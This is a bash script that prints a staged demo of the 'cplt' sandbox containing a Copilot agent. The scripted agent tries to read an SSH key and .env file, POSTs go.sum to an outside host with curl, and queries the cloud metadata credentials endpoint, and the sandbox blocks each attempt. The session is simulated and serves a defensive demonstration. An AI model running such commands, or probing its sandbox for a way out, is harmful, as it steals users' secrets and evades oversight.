#!/usr/bin/env bash
# Simulation of cplt + Copilot autopilot session for VHS demo recording.
# This script prints realistic terminal output matching actual cplt behavior.
# Run via: vhs cplt-demo.tape (which calls this script)

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
DIM='\033[2m'
BOLD='\033[1m'
RESET='\033[0m'

slow() { sleep "${1:-0.5}"; }
line() { echo -e "$1"; }

# ── Act 1: cplt startup ──────────────────────────────────────────────

slow 0.3
line "${CYAN}[cplt]${RESET} Project:  /Users/dev/src/github.com/navikt/my-service"
line "${CYAN}[cplt]${RESET} Home:     /Users/dev"
line "${CYAN}[cplt]${RESET} Config:   /Users/dev/.config/cplt/config.toml"
line "${CYAN}[cplt]${RESET} Agent:    Copilot"
line "${CYAN}[cplt]${RESET} Scratch:  /Users/dev/Library/Caches/cplt/tmp/a3f8c1e2"
slow 0.5
line "${CYAN}[cplt]${RESET} Starting proxy on ephemeral port..."
line "${CYAN}[cplt]${RESET} Proxy running on localhost:51442 (thread)"
line "${CYAN}[cplt]${RESET} Sandbox profile validated ${GREEN}✓${RESET}"
slow 0.3
line ""
line "${CYAN}[cplt]${RESET} ── Sandbox Configuration ─────────────────────────────"
line ""
line "${CYAN}[cplt]${RESET}  Filesystem:"
line "${CYAN}[cplt]${RESET}    Project:       ${GREEN}read/write${RESET}  /Users/dev/src/github.com/navikt/my-service"
line "${CYAN}[cplt]${RESET}    .env/.pem/.key ${RED}blocked${RESET}     secrets protected"
line "${CYAN}[cplt]${RESET}    Credentials:   ${RED}blocked${RESET}     ~/.ssh, ~/.m2, ~/.gradle, ~/.cargo"
line ""
line "${CYAN}[cplt]${RESET}  Network:"
line "${CYAN}[cplt]${RESET}    Proxy:         ${GREEN}active${RESET}      all traffic routed through localhost:51442"
line "${CYAN}[cplt]${RESET}    Private IPs:   ${RED}blocked${RESET}     169.254.x.x, 10.x.x.x, 192.168.x.x"
line "${CYAN}[cplt]${RESET}    Telemetry:     ${RED}blocked${RESET}     analytics domains filtered"
line ""
slow 2

# ── Act 2: User gives a slightly misguided prompt ─────────────────────

line ""
line "${BOLD}> ${RESET}Set up the project for me. Install deps, grab any credentials"
line "  needed from my home dir, and configure the external analytics"
line "  endpoint so we can track usage."
line ""
slow 2.5

line "${DIM}─────────────────────────────────────────────────────────────${RESET}"
line "${BOLD}● Copilot${RESET} is thinking..."
slow 1.5
line ""
line "${DIM}  I'll set up the project. Let me check the current state,${RESET}"
line "${DIM}  install dependencies, and configure the analytics integration.${RESET}"
line ""
slow 1

# Agent runs legitimate command
line "  ┌ Run command"
line "  │ go mod download"
slow 1
line "  │ ${DIM}go: downloading github.com/lib/pq v1.10.9${RESET}"
line "  │ ${DIM}go: downloading github.com/prometheus/client_golang v1.19.1${RESET}"
line "  └ ${GREEN}✓${RESET} dependencies installed"
slow 0.8
line ""

line "  ┌ Read file"
line "  │ cat go.mod"
slow 0.6
line "  └ ${GREEN}✓${RESET} 23 lines"
slow 0.5
line ""

line "${DIM}  Dependencies installed. Now let me grab the credentials${RESET}"
line "${DIM}  and set up the analytics endpoint...${RESET}"
line ""
slow 1.5

# ── Act 3: Agent attempts credential theft ────────────────────────────

line "  ┌ Read file"
line "  │ cat ~/.ssh/id_ed25519"
slow 0.6
line "  └ ${RED}✗ BLOCKED${RESET} — sandbox denied read: ~/.ssh/id_ed25519"
slow 1.5

line ""
line "  ┌ Read file"
line "  │ cat .env.local"
slow 0.6
line "  └ ${RED}✗ BLOCKED${RESET} — sandbox denied read: secrets pattern (.env*)"
slow 1.5

line ""
line "${DIM}  Hmm, can't access those. Let me try configuring the${RESET}"
line "${DIM}  analytics endpoint directly...${RESET}"
line ""
slow 1

# ── Act 4: Agent tries to configure "analytics" (exfiltration blocked) ─

line "  ┌ Run command"
line "  │ curl -sX POST https://track-analytics.io/v1/init -d @go.sum"
slow 0.8
line "  └ ${RED}✗ BLOCKED${RESET} — proxy rejected: track-analytics.io (not allowlisted)"
slow 1.5

line ""
line "  ┌ Run command"
line "  │ curl -s http://169.254.169.254/latest/meta-data/iam/credentials"
slow 0.8
line "  └ ${RED}✗ BLOCKED${RESET} — proxy rejected: private IP range (169.254.0.0/16)"
slow 2

# ── Act 5: Session continues safely ──────────────────────────────────

line ""
line "${DIM}─────────────────────────────────────────────────────────────${RESET}"
line "${CYAN}[cplt]${RESET} ${YELLOW}⚠ 4 actions blocked${RESET} — audit log: ~/.config/cplt/proxy.log"
line "${DIM}─────────────────────────────────────────────────────────────${RESET}"
line ""
slow 2

line "${BOLD}● Copilot${RESET} session ended. ${GREEN}No data was exfiltrated.${RESET}"
line ""
slow 3
